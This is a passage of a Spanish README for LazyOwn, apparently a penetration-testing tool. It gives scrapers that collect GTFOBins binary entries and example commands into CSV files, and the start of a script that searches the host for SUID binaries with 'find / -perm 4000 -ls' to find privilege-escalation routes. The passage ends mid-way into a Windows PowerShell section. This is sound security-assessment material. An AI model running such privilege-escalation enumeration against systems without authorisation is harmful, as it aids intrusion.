src="https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<p>para ejecutar una busqueda contra la maquina a analizar</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown.py</span></code></pre></div>
<p>en el caso de querer actualizar hacemos</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> LazyOwn</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="pp">*</span>.csv</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="pp">*</span>.parquet</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">./update_db.sh</span></span></code></pre></div>
<p>El proyecto consta de tres scripts principales:</p>
<ol type="1">
<li>search.py Este script extrae información de binarios y sus funciones
desde GTFOBins y la guarda en un archivo CSV. ya hice el scraping así
que mejor evitar y usar la db que ya tiene en formato csv, a menos que
quieran actualizar la db</li>
</ol>
<div class="sourceCode" id="cb12"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> bs4 <span class="im">import</span> BeautifulSoup</span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> csv</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co"># URL del servidor que contiene el HTML</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&quot;https://gtfobins.github.io/index.html&quot;</span></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Hacer una solicitud GET al servidor</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>response <span class="op">=</span> requests.get(url)</span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar si la solicitud fue exitosa</span></span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> response.status_code <span class="op">==</span> <span class="dv">200</span>:</span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>    html_content <span class="op">=</span> response.text</span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;Error al obtener el HTML del servidor&quot;</span>)</span>
<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a>    exit()</span>
<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Parsear el contenido HTML con Beautiful Soup</span></span>
<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a>soup <span class="op">=</span> BeautifulSoup(html_content, <span class="st">&#39;html.parser&#39;</span>)</span>
<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a><span class="co"># Encontrar el contenedor de la tabla</span></span>
<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>table_wrapper <span class="op">=</span> soup.find(<span class="st">&#39;div&#39;</span>, <span class="bu">id</span><span class="op">=</span><span class="st">&#39;bin-table-wrapper&#39;</span>)</span>
<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a><span class="co"># Inicializar una lista para almacenar la información</span></span>
<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a>data <span class="op">=</span> []</span>
<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a><span class="co"># Recorrer todas las filas de la tabla</span></span>
<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> row <span class="kw">in</span> table_wrapper.find_all(<span class="st">&#39;tr&#39;</span>):</span>
<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a>    bin_name <span class="op">=</span> row.find(<span class="st">&#39;a&#39;</span>, class_<span class="op">=</span><span class="st">&#39;bin-name&#39;</span>)</span>
<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> bin_name:</span>
<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a>        bin_name_text <span class="op">=</span> bin_name.text.strip()</span>
<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a>        functions <span class="op">=</span> []</span>
<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> func <span class="kw">in</span> row.find_all(<span class="st">&#39;li&#39;</span>):</span>
<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a>            function_link <span class="op">=</span> func.find(<span class="st">&#39;a&#39;</span>)</span>
<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> function_link:</span>
<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a>                function_href <span class="op">=</span> function_link.get(<span class="st">&#39;href&#39;</span>).strip()</span>
<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a>                function_name <span class="op">=</span> function_link.text.strip()</span>
<span id="cb12-38"><a href="#cb12-38" aria-hidden="true" tabindex="-1"></a>                functions.append({<span class="st">&#39;name&#39;</span>: function_name, <span class="st">&#39;href&#39;</span>: function_href})</span>
<span id="cb12-39"><a href="#cb12-39" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb12-40"><a href="#cb12-40" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Añadir la información a la lista de datos</span></span>
<span id="cb12-41"><a href="#cb12-41" aria-hidden="true" tabindex="-1"></a>        data.append({<span class="st">&#39;binary&#39;</span>: bin_name_text, <span class="st">&#39;functions&#39;</span>: functions})</span>
<span id="cb12-42"><a href="#cb12-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-43"><a href="#cb12-43" aria-hidden="true" tabindex="-1"></a><span class="co"># Guardar la información en un archivo CSV</span></span>
<span id="cb12-44"><a href="#cb12-44" aria-hidden="true" tabindex="-1"></a>csv_file <span class="op">=</span> <span class="st">&quot;bin_data.csv&quot;</span></span>
<span id="cb12-45"><a href="#cb12-45" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(csv_file, mode<span class="op">=</span><span class="st">&#39;w&#39;</span>, newline<span class="op">=</span><span class="st">&#39;&#39;</span>) <span class="im">as</span> <span class="bu">file</span>:</span>
<span id="cb12-46"><a href="#cb12-46" aria-hidden="true" tabindex="-1"></a>    writer <span class="op">=</span> csv.writer(<span class="bu">file</span>)</span>
<span id="cb12-47"><a href="#cb12-47" aria-hidden="true" tabindex="-1"></a>    writer.writerow([<span class="st">&#39;Binary&#39;</span>, <span class="st">&#39;Function Name&#39;</span>, <span class="st">&#39;Function URL&#39;</span>])</span>
<span id="cb12-48"><a href="#cb12-48" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> entry <span class="kw">in</span> data:</span>
<span id="cb12-49"><a href="#cb12-49" aria-hidden="true" tabindex="-1"></a>        binary <span class="op">=</span> entry[<span class="st">&#39;binary&#39;</span>]</span>
<span id="cb12-50"><a href="#cb12-50" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> func <span class="kw">in</span> entry[<span class="st">&#39;functions&#39;</span>]:</span>
<span id="cb12-51"><a href="#cb12-51" aria-hidden="true" tabindex="-1"></a>            writer.writerow([binary, func[<span class="st">&#39;name&#39;</span>], func[<span class="st">&#39;href&#39;</span>]])</span>
<span id="cb12-52"><a href="#cb12-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-53"><a href="#cb12-53" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&quot;Datos guardados en </span><span class="sc">{</span>csv_file<span class="sc">}</span><span class="ss">&quot;</span>)</span></code></pre></div>
<h2 id="detailed_search.py">2. detailed_search.py</h2>
<p>Este script lee el archivo CSV generado por scrape_bins.py, extrae
detalles adicionales de cada función y guarda los datos en un segundo
archivo CSV.</p>
<div class="sourceCode" id="cb13"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> bs4 <span class="im">import</span> BeautifulSoup</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> csv</span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> urllib.parse <span class="im">import</span> urljoin</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> time</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="co"># URL base del servidor</span></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>base_url <span class="op">=</span> <span class="st">&quot;https://gtfobins.github.io/&quot;</span></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Nombre del archivo CSV de entrada</span></span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>input_csv <span class="op">=</span> <span class="st">&quot;bin_data.csv&quot;</span></span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Nombre del archivo de salida CSV</span></span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a>output_csv <span class="op">=</span> <span class="st">&quot;bin_data_relevant.csv&quot;</span></span>
<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Función para obtener la información relevante de una URL</span></span>
<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> obtener_informacion(url):</span>
<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a>    response <span class="op">=</span> requests.get(url)</span>
<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> response.status_code <span class="op">!=</span> <span class="dv">200</span>:</span>
<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;Error al obtener la URL: </span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">&quot;</span>)</span>
<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> []</span>
<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a>    soup <span class="op">=</span> BeautifulSoup(response.text, <span class="st">&#39;html.parser&#39;</span>)</span>
<span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a>    data <span class="op">=</span> []</span>
<span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> section <span class="kw">in</span> soup.find_all(<span class="st">&#39;h2&#39;</span>, class_<span class="op">=</span><span class="st">&#39;function-name&#39;</span>):</span>
<span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a>        function_name <span class="op">=</span> section.text.strip()</span>
<span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a>        function_id <span class="op">=</span> section.get(<span class="st">&#39;id&#39;</span>)</span>
<span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a>        function_url <span class="op">=</span> <span class="ss">f&quot;</span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">#</span><span class="sc">{</span>function_id<span class="sc">}</span><span class="ss">&quot;</span></span>
<span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a>        description <span class="op">=</span> section.find_next(<span class="st">&#39;p&#39;</span>).text.strip() <span class="cf">if</span> section.find_next(<span class="st">&#39;p&#39;</span>) <span class="cf">else</span> <span class="st">&quot;&quot;</span></span>
<span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a>        example <span class="op">=</span> section.find_next(<span class="st">&#39;code&#39;</span>).text.strip() <span class="cf">if</span> section.find_next(<span class="st">&#39;code&#39;</span>) <span class="cf">else</span> <span class="st">&quot;&quot;</span></span>
<span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a>        data.append({</span>
<span id="cb13-35"><a href="#cb13-35" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_name&quot;</span>: function_name,</span>
<span id="cb13-36"><a href="#cb13-36" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_url&quot;</span>: function_url,</span>
<span id="cb13-37"><a href="#cb13-37" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;description&quot;</span>: description,</span>
<span id="cb13-38"><a href="#cb13-38" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;example&quot;</span>: example</span>
<span id="cb13-39"><a href="#cb13-39" aria-hidden="true" tabindex="-1"></a>        })</span>
<span id="cb13-40"><a href="#cb13-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-41"><a href="#cb13-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> data</span>
<span id="cb13-42"><a href="#cb13-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-43"><a href="#cb13-43" aria-hidden="true" tabindex="-1"></a><span class="co"># Leer el archivo CSV de entrada</span></span>
<span id="cb13-44"><a href="#cb13-44" aria-hidden="true" tabindex="-1"></a>binarios_funciones <span class="op">=</span> {}</span>
<span id="cb13-45"><a href="#cb13-45" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(input_csv, mode<span class="op">=</span><span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;utf-8&#39;</span>) <span class="im">as</span> <span class="bu">file</span>:</span>
<span id="cb13-46"><a href="#cb13-46" aria-hidden="true" tabindex="-1"></a>    reader <span class="op">=</span> csv.DictReader(<span class="bu">file</span>)</span>
<span id="cb13-47"><a href="#cb13-47" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> row <span class="kw">in</span> reader:</span>
<span id="cb13-48"><a href="#cb13-48" aria-hidden="true" tabindex="-1"></a>        binary <span class="op">=</span> row[<span class="st">&#39;Binary&#39;</span>]</span>
<span id="cb13-49"><a href="#cb13-49" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> binary <span class="kw">not</span> <span class="kw">in</span> binarios_funciones:</span>
<span id="cb13-50"><a href="#cb13-50" aria-hidden="true" tabindex="-1"></a>            binarios_funciones[binary] <span class="op">=</span> row[<span class="st">&#39;Function URL&#39;</span>].split(<span class="st">&#39;#&#39;</span>)[<span class="dv">0</span>]</span>
<span id="cb13-51"><a href="#cb13-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-52"><a href="#cb13-52" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar si ya existe un archivo de salida y hasta dónde se ha procesado</span></span>
<span id="cb13-53"><a href="#cb13-53" aria-hidden="true" tabindex="-1"></a>resume <span class="op">=</span> <span class="va">False</span></span>
<span id="cb13-54"><a href="#cb13-54" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> os.path.exists(output_csv):</span>
<span id="cb13-55"><a href="#cb13-55" aria-hidden="true" tabindex="-1"></a>    <span class="cf">with</span> <span class="bu">open</span>(output_csv, mode<span class="op">=</span><span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;utf-8&#39;</span>) <span class="im">as</span> <span class="bu">file</span>:</span>
<span id="cb13-56"><a href="#cb13-56" aria-hidden="true" tabindex="-1"></a>        reader <span class="op">=</span> csv.reader(<span class="bu">file</span>)</span>
<span id="cb13-57"><a href="#cb13-57" aria-hidden="true" tabindex="-1"></a>        rows <span class="op">=</span> <span class="bu">list</span>(reader)</span>
<span id="cb13-58"><a href="#cb13-58" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="bu">len</span>(rows) <span class="op">&gt;</span> <span class="dv">1</span>:</span>
<span id="cb13-59"><a href="#cb13-59" aria-hidden="true" tabindex="-1"></a>            last_processed <span class="op">=</span> rows[<span class="op">-</span><span class="dv">1</span>][<span class="dv">2</span>]</span>
<span id="cb13-60"><a href="#cb13-60" aria-hidden="true" tabindex="-1"></a>            resume <span class="op">=</span> <span class="va">True</span></span>
<span id="cb13-61"><a href="#cb13-61" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-62"><a href="#cb13-62" aria-hidden="true" tabindex="-1"></a><span class="co"># Inicializar una lista para almacenar toda la información</span></span>
<span id="cb13-63"><a href="#cb13-63" aria-hidden="true" tabindex="-1"></a>informacion_binarios <span class="op">=</span> []</span>
<span id="cb13-64"><a href="#cb13-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-65"><a href="#cb13-65" aria-hidden="true" tabindex="-1"></a><span class="co"># Abrir el archivo CSV para escritura</span></span>
<span id="cb13-66"><a href="#cb13-66" aria-hidden="true" tabindex="-1"></a>csv_file <span class="op">=</span> <span class="bu">open</span>(output_csv, mode<span class="op">=</span><span class="st">&#39;w&#39;</span>, newline<span class="op">=</span><span class="st">&#39;&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;utf-8&#39;</span>)</span>
<span id="cb13-67"><a href="#cb13-67" aria-hidden="true" tabindex="-1"></a>csv_writer <span class="op">=</span> csv.writer(csv_file)</span>
<span id="cb13-68"><a href="#cb13-68" aria-hidden="true" tabindex="-1"></a>csv_writer.writerow([<span class="st">&#39;Binary&#39;</span>, <span class="st">&#39;Function Name&#39;</span>, <span class="st">&#39;Function URL&#39;</span>, <span class="st">&#39;Description&#39;</span>, <span class="st">&#39;Example&#39;</span>])</span>
<span id="cb13-69"><a href="#cb13-69" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-70"><a href="#cb13-70" aria-hidden="true" tabindex="-1"></a><span class="co"># Recorrer la lista de binarios y sus funciones</span></span>
<span id="cb13-71"><a href="#cb13-71" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> binary, url <span class="kw">in</span> binarios_funciones.items():</span>
<span id="cb13-72"><a href="#cb13-72" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Si estamos retomando desde un punto anterior, saltamos hasta el último URL procesado</span></span>
<span id="cb13-73"><a href="#cb13-73" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> resume:</span>
<span id="cb13-74"><a href="#cb13-74" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> url <span class="op">!=</span> last_processed:</span>
<span id="cb13-75"><a href="#cb13-75" aria-hidden="true" tabindex="-1"></a>            <span class="cf">continue</span></span>
<span id="cb13-76"><a href="#cb13-76" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
<span id="cb13-77"><a href="#cb13-77" aria-hidden="true" tabindex="-1"></a>            resume <span class="op">=</span> <span class="va">False</span></span>
<span id="cb13-78"><a href="#cb13-78" aria-hidden="true" tabindex="-1"></a>    full_url <span class="op">=</span> urljoin(base_url, url)</span>
<span id="cb13-79"><a href="#cb13-79" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb13-80"><a href="#cb13-80" aria-hidden="true" tabindex="-1"></a>    informacion <span class="op">=</span> obtener_informacion(full_url)</span>
<span id="cb13-81"><a href="#cb13-81" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> item <span class="kw">in</span> informacion:</span>
<span id="cb13-82"><a href="#cb13-82" aria-hidden="true" tabindex="-1"></a>        informacion_binarios.append({</span>
<span id="cb13-83"><a href="#cb13-83" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;binary&quot;</span>: binary,</span>
<span id="cb13-84"><a href="#cb13-84" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_name&quot;</span>: item[<span class="st">&quot;function_name&quot;</span>],</span>
<span id="cb13-85"><a href="#cb13-85" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_url&quot;</span>: item[<span class="st">&quot;function_url&quot;</span>],</span>
<span id="cb13-86"><a href="#cb13-86" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;description&quot;</span>: item[<span class="st">&quot;description&quot;</span>],</span>
<span id="cb13-87"><a href="#cb13-87" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;example&quot;</span>: item[<span class="st">&quot;example&quot;</span>]</span>
<span id="cb13-88"><a href="#cb13-88" aria-hidden="true" tabindex="-1"></a>        })</span>
<span id="cb13-89"><a href="#cb13-89" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Guardar la información en el archivo CSV</span></span>
<span id="cb13-90"><a href="#cb13-90" aria-hidden="true" tabindex="-1"></a>        csv_writer.writerow([binary, item[<span class="st">&#39;function_name&#39;</span>], item[<span class="st">&#39;function_url&#39;</span>], item[<span class="st">&#39;description&#39;</span>], item[<span class="st">&#39;example&#39;</span>]])</span>
<span id="cb13-91"><a href="#cb13-91" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;[+] Binary: </span><span class="sc">{</span>binary<span class="sc">}</span><span class="ss"> </span><span class="sc">{</span>item[<span class="st">&#39;function_name&#39;</span>]<span class="sc">}</span><span class="ss">&quot;</span>)</span>
<span id="cb13-92"><a href="#cb13-92" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Hacemos una pausa de 5 segundos entre cada solicitud de URL</span></span>
<span id="cb13-93"><a href="#cb13-93" aria-hidden="true" tabindex="-1"></a>    time.sleep(<span class="dv">5</span>)</span>
<span id="cb13-94"><a href="#cb13-94" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-95"><a href="#cb13-95" aria-hidden="true" tabindex="-1"></a><span class="co"># Cerrar el archivo CSV</span></span>
<span id="cb13-96"><a href="#cb13-96" aria-hidden="true" tabindex="-1"></a>csv_file.close()</span>
<span id="cb13-97"><a href="#cb13-97" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-98"><a href="#cb13-98" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&quot;Datos guardados en </span><span class="sc">{</span>output_csv<span class="sc">}</span><span class="ss">&quot;</span>)</span></code></pre></div>
<ol start="3" type="1">
<li>lazyown.py Este script analiza los binarios en el sistema y genera
opciones basadas en la información recopilada. Detecta si el sistema
operativo es Linux o Windows y ejecuta el comando adecuado para buscar
binarios con permisos elevados.</li>
</ol>
<div class="sourceCode" id="cb14"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> pandas <span class="im">as</span> pd</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> subprocess</span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> platform</span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Lee los CSVs y crea los DataFrames</span></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>df1 <span class="op">=</span> pd.read_csv(<span class="st">&#39;bin_data.csv&#39;</span>)</span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>df2 <span class="op">=</span> pd.read_csv(<span class="st">&#39;bin_data_relevant.csv&#39;</span>)</span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Guarda los DataFrames como Parquet</span></span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>df1.to_parquet(<span class="st">&#39;binarios.parquet&#39;</span>)</span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>df2.to_parquet(<span class="st">&#39;detalles.parquet&#39;</span>)</span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Función para realizar la búsqueda y generar el CSV de salida</span></span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> buscar_binarios():</span>
<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>    binarios_encontrados <span class="op">=</span> <span class="bu">set</span>()</span>
<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Detecta el sistema operativo</span></span>
<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>    sistema_operativo <span class="op">=</span> platform.system()</span>
<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> sistema_operativo <span class="op">==</span> <span class="st">&#39;Linux&#39;</span>:</span>
<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Ejecuta el comando find para Linux</span></span>
<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> subprocess.run([<span class="st">&#39;find&#39;</span>, <span class="st">&#39;/&#39;</span>, <span class="st">&#39;-perm&#39;</span>, <span class="st">&#39;4000&#39;</span>, <span class="st">&#39;-ls&#39;</span>], stdout<span class="op">=</span>subprocess.PIPE, stderr<span class="op">=</span>subprocess.PIPE, text<span class="op">=</span><span class="va">True</span>)</span>
<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>        output <span class="op">=</span> result.stdout</span>
<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>        </span>
<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Extrae los binarios encontrados</span></span>
<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> line <span class="kw">in</span> output.split(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>):</span>
<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> line:</span>
<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>                binario <span class="op">=</span> os.path.basename(line.split()[<span class="op">-</span><span class="dv">1</span>])</span>
<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a>                binarios_encontrados.add(binario)</span>
<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a>    <span class="cf">elif</span> sistema_operativo <span class="op">==</span> <span class="st">&#39;Windows&#39;</span>:</span>
<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Script de PowerShell para Windows</span></span>
<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a>        powershell_script <span class="op">=</span> <span class="st">&quot;&quot;&quot;</span></span>
